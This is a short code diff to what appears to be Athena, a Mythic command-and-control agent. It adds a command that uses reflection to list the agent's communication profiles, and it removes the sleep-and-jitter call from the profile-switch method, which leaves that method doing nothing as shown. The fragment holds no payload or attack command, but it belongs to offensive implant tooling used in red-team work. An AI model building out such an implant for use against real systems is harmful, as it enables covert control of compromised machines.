@@ -13,6 +13,7 @@ using System.Collections.Concurrent;
 using System.Text;
 using Athena.Plugins;
 using Newtonsoft.Json;
+using Athena.Models.Config;
 
 namespace Athena.Commands
 {
@@ -288,7 +289,28 @@ namespace Athena.Commands
         private void SwitchProfile(MythicJob job)
         {
             ProfileEventArgs switchArgs = new ProfileEventArgs(job);
-            SetSleepAndJitter(this, switchArgs);
+        }
+
+        private async Task<ResponseResult> ListProfiles(MythicJob job)
+        {
+            StringBuilder sb = new StringBuilder();
+            var type = typeof(IProfile);
+            var types = AppDomain.CurrentDomain.GetAssemblies()
+                .SelectMany(s => s.GetTypes())
+                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
+
+            foreach(var prof in types)
+            {
+                sb.AppendLine(prof.Name);
+            }
+
+            return new ResponseResult()
+            {
+                task_id = job.task.id,
+                completed = "true",
+                user_output = sb.ToString()
+            };
+
         }
 
         /// <summary>
